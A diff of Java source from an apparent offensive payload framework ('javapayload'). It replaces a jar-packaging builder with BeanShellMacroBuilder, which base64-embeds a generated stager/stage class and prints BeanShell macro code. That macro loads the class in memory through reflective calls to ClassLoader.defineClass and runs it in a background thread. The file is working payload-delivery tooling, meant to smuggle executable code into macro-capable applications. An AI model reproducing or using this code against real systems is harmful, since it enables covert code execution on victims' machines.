@@ -34,51 +34,39 @@
 
 package javapayload.builder;
 
-import java.io.FileOutputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
 import java.io.InputStream;
-import java.util.jar.JarOutputStream;
-import java.util.jar.Manifest;
-import java.util.zip.ZipEntry;
 
-public class JarBuilder {
-	protected static void buildJar(String filename, Class[] classes, Manifest manifest, byte[] extraResource) throws Exception {
-		manifest.getMainAttributes().putValue("Manifest-Version", "1.0");
-		final JarOutputStream jos = new JarOutputStream(new FileOutputStream(filename), manifest);
-		final byte[] buf = new byte[4096];
-		int len;
-		for (int i = 0; i < classes.length; i++) {
-			final String classname = classes[i].getName().replace('.', '/') + ".class";
-			jos.putNextEntry(new ZipEntry(classname));
-			final InputStream in = JarBuilder.class.getResourceAsStream("/" + classname);
-			while ((len = in.read(buf)) != -1) {
-				jos.write(buf, 0, len);
-			}
-			in.close();
-		}
-		if (extraResource != null) {
-			jos.putNextEntry(new ZipEntry("x"));
-			jos.write(extraResource, 0, extraResource.length);
-		}
-		jos.close();
-	}
-
+public class BeanShellMacroBuilder {
 	public static void main(String[] args) throws Exception {
-		if (args.length == 0) {
-			System.out.println("Usage: java javapayload.builder.JarBuilder <stager> [<moreStagers...>]");
+		if (args.length < 3) {
+			System.out.println("Usage: java javapayload.builder.BeanShellMacroBuilder <stager> [stageroptions] -- <stage> [stageoptions]");
 			return;
 		}
-		StringBuffer jarName = new StringBuffer(); 
-		final Class[] classes = new Class[args.length+2];
-		classes[0] = javapayload.loader.StandaloneLoader.class;
-		classes[1] = javapayload.stager.Stager.class;
-		for (int i = 0; i < args.length; i++) {
-			if (i > 0)
-				jarName.append('_');
-			jarName.append(args[i]);
-			classes[i+2] = Class.forName("javapayload.stager." + args[i]);
-		}
-		final Manifest manifest = new Manifest();
-		manifest.getMainAttributes().putValue("Main-Class", "javapayload.loader.StandaloneLoader");
-		buildJar(jarName.append(".jar").toString(), classes, manifest, null);
+		String[] builderArgs = new String[args.length+1];
+		System.arraycopy(args, 0, builderArgs, 1, args.length);
+		builderArgs[0] = "Tmp";
+		EmbeddedClassBuilder.main(builderArgs);
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		InputStream in = new FileInputStream("Tmp.class");
+		new sun.misc.BASE64Encoder().encode(in, baos);
+		in.close();
+		new File("Tmp.class").delete();
+		String data = new String(baos.toByteArray(), "ISO-8859-1");
+		data = data.replaceAll("\r\n", "\n").replace('\r','\n');
+		data = data.replaceAll("\n", "\"+\r\n  \"");
+		System.out.println("String BASE64 = \""+data+"\";");
+		System.out.println("byte[] DATA = new sun.misc.BASE64Decoder().decodeBuffer(BASE64);");
+		System.out.println("ClassLoader ldr = new URLClassLoader(new URL[0]);");
+		System.out.println("java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[] {byte[].class, int.class, int.class});");
+		System.out.println("m.setAccessible(true);");
+		System.out.println("Class c = (Class)m.invoke(ldr, new Object[] {DATA, 0, DATA.length});");
+		System.out.println("m = ClassLoader.class.getDeclaredMethod(\"resolveClass\", new Class[] {Class.class});");
+		System.out.println("m.setAccessible(true);");
+		System.out.println("m.invoke(ldr, new Object[] {c});");
+		System.out.println("run() { c.getMethod(\"main\", new Class[] {String[].class}).invoke(null, new Object[] {new String[0]});}");
+		System.out.println("new Thread(this).start();");
 	}
 }
